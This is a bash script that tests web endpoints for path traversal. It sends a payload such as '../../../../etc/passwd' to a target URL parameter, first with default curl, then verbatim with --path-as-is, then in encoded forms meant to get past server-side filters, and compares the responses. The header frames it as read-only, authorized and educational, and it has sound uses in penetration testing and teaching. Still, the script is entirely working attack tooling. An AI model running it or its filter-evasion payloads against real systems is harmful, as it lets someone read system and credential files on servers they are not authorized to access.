#!/usr/bin/env bash
# Send a path-traversal payload the way you MEANT to, not the way curl rewrites
# it. Shows the request line each time so you test what you think you test.
# Read-only (GET). Authorized and educational use only.
# Writeup: https://jperezduerto.info/techniques/curl-path-traversal-false-negative/
#
#   ./traversal-check.sh 'http://TARGET/download?file=' '../../../../etc/passwd'
#
# arg1 = URL up to and including the parameter; arg2 = traversal payload.

set -u
base="${1:?usage: traversal-check.sh <url-with-param=> <payload>}"
payload="${2:?usage: traversal-check.sh <url-with-param=> <payload>}"

req_line() { curl -s -o /dev/null -D - "$@" 2>/dev/null | head -1; }

echo "== 1. default curl (curl may normalize ../ away -> false negative) =="
echo "   request: $(curl -s -o /dev/null -w '%{url_effective}\n' "${base}${payload}")"
curl -s -o /tmp/_t1 -w 'HTTP %{http_code}  %{size_download} bytes\n' "${base}${payload}"

echo "== 2. --path-as-is (payload sent verbatim; this is the real test) =="
curl -s --path-as-is -o /tmp/_t2 -w 'HTTP %{http_code}  %{size_download} bytes\n' "${base}${payload}"

echo "== 3. encoded variants (defeat server-side filters, not curl normalization) =="
for enc in "$(printf '%s' "$payload" | sed 's#/#%2f#g')" \
           "$(printf '%s' "$payload" | sed 's#\.\.#%2e%2e#g')" \
           "$(printf '%s' "$payload" | sed 's#\.\./#....//#g')"; do
  printf '   %-40s -> ' "$enc"
  curl -s --path-as-is -o /dev/null -w 'HTTP %{http_code}  %{size_download}b\n' "${base}${enc}"
done

echo
echo "Compare sizes/codes: if 2 or 3 returns file-shaped content where 1 did not, the endpoint is vulnerable and default curl was lying. Diff /tmp/_t1 and /tmp/_t2 to confirm."
